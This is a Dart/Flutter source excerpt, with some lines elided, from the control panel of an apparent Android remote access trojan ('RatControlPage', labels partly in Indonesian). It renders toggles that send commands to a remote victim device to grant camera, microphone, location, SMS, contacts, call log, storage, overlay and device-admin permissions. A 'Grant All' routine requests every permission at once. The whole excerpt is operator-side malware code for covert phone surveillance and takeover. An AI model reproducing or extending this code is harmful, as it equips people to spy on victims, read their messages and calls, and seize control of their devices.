...
class _RatControlPageState extends State<RatControlPage> {
  ...
  Widget _buildControl(RatDevice d) {
    return CustomScrollView(
      ...
      slivers: [
        ...
        const SliverToBoxAdapter(child: _SectionTitle('Self Permissions')),
        SliverPadding(
          padding: const EdgeInsets.symmetric(horizontal: 16),
          sliver: SliverGrid(
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
            ...
            delegate: SliverChildListDelegate(_buildPermissionTiles(d)),
          ),
        ),
  ...
  // ─── Self Permission Tiles ───
  List<Widget> _buildPermissionTiles(RatDevice d) {
    return [
      _CtrlTile(
        icon: Icons.photo_camera_outlined,
        iconColor: _red,
        name: 'Kamera',
        sub: d.statusBool('permCamera') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permCamera') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permCamera'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permCamera', 'grantCamera', v),
        ),
      ),
      _CtrlTile(
        ...
        iconColor: _teal,
        name: 'Mikrofon',
        sub: d.statusBool('permMic') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permMic') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permMic'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permMic', 'grantMic', v),
        ),
      ),
      _CtrlTile(
        icon: Icons.location_on_outlined,
        iconColor: _green,
        name: 'Lokasi',
        sub: d.statusBool('permLocation') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permLocation') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permLocation'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permLocation', 'grantLocation', v),
        ),
      ),
      _CtrlTile(
        icon: Icons.sms_outlined,
        iconColor: _amber,
        name: 'SMS (Read)',
        sub: d.statusBool('permSms') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permSms') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permSms'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permSms', 'grantSms', v),
        ),
      ),
      _CtrlTile(
        icon: Icons.people_outline,
        iconColor: _blue2,
        name: 'Kontak',
        sub: d.statusBool('permContacts') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permContacts') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permContacts'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permContacts', 'grantContacts', v),
        ),
      ),
      _CtrlTile(
        ...
        iconColor: _teal,
        name: 'Phone State',
        sub: d.statusBool('permPhoneState') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permPhoneState') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permPhoneState'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permPhoneState', 'grantPhoneState', v),
        ),
      ),
      _CtrlTile(
        icon: Icons.call_outlined,
        iconColor: _green,
        name: 'Telepon',
        sub: d.statusBool('permCallPhone') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permCallPhone') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permCallPhone'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permCallPhone', 'grantCallPhone', v),
        ),
      ),
      _CtrlTile(
        icon: Icons.history,
        iconColor: _amber,
        name: 'Call Log',
        sub: d.statusBool('permCallLog') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permCallLog') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permCallLog'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permCallLog', 'grantCallLog', v),
        ),
      ),
      _CtrlTile(
        ...
        iconColor: _orange,
        name: 'Storage',
        sub: d.statusBool('permStorage') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permStorage') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permStorage'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permStorage', 'grantStorage', v),
        ),
      ),
      _CtrlTile(
        ...
        iconColor: _blue2,
        name: 'Kalender',
        sub: d.statusBool('permCalendar') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permCalendar') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permCalendar'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permCalendar', 'grantCalendar', v),
        ),
      ),
      _CtrlTile(
        ...
        iconColor: _purple,
        name: 'Overlay',
        sub: d.statusBool('permOverlay') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permOverlay') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permOverlay'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permOverlay', 'grantOverlay', v),
        ),
      ),
      _CtrlTile(
        icon: Icons.notifications_outlined,
        iconColor: _sky,
        name: 'Notifikasi',
        sub: d.statusBool('permNotification') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permNotification') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permNotification'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permNotification', 'grantNotification', v),
        ),
      ),
      _CtrlTile(
        icon: Icons.battery_saver_outlined,
        iconColor: _green,
        name: 'Battery Optimize',
        sub: d.statusBool('permBattery') ? '\u25CF GRANTED' : '\u25CB BELUM',
        subColor: d.statusBool('permBattery') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permBattery'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permBattery', 'grantBattery', v),
        ),
      ),
      _CtrlTile(
        ...
        iconColor: _red,
        name: 'Device Admin',
        sub: d.statusBool('permDeviceAdmin') ? '\u25CF ACTIVE' : '\u25CB BELUM',
        subColor: d.statusBool('permDeviceAdmin') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('permDeviceAdmin'),
          activeColor: _green,
          onChanged: (v) => _togglePerm('permDeviceAdmin', 'grantDeviceAdmin', v),
        ),
      ),
      _CtrlTile(
        icon: Icons.security_outlined,
        iconColor: _green,
        name: 'Grant All',
        sub: 'SEMUA IZIN SEKALIGUS',
        onTap: _grantAllPermissions,
      ),
    ];
  }

  void _togglePerm(String statusKey, String command, bool grant) {
    _cmd(command, grant ? 'true' : 'false');
    _patch(statusKey, grant);
    _toast(grant ? 'Meminta izin...' : 'Izin dicabut', info: !grant);
  }

  void _grantAllPermissions() {
    final perms = [
      ('permCamera', 'grantCamera'),
      ('permMic', 'grantMic'),
      ('permLocation', 'grantLocation'),
      ('permSms', 'grantSms'),
      ('permContacts', 'grantContacts'),
      ('permPhoneState', 'grantPhoneState'),
      ('permCallPhone', 'grantCallPhone'),
      ('permCallLog', 'grantCallLog'),
      ('permStorage', 'grantStorage'),
      ('permCalendar', 'grantCalendar'),
      ('permOverlay', 'grantOverlay'),
      ('permNotification', 'grantNotification'),
      ('permBattery', 'grantBattery'),
      ('permDeviceAdmin', 'grantDeviceAdmin'),
    ];
    _cmd(kCmdGrantAll, 'true');
    for (final (key, _) in perms) {
      _patch(key, true);
    }
    _toast('Semua izin diminta', info: true);
  }
